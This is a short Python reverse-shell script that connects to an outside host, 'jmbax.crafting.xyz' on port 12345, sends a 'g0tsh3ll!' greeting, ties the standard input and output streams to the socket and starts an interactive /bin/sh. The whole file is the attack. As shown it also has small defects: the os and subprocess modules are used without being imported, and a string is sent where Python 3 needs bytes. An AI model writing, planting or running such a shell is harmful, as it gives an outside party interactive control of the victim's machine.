#!/usr/bin/env python3

import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host='jmbax.crafting.xyz'
port = 12345

socket.setdefaulttimeout(60)
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
s.send('g0tsh3ll!') 
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
shell = subprocess.call(["/bin/sh","-i"])
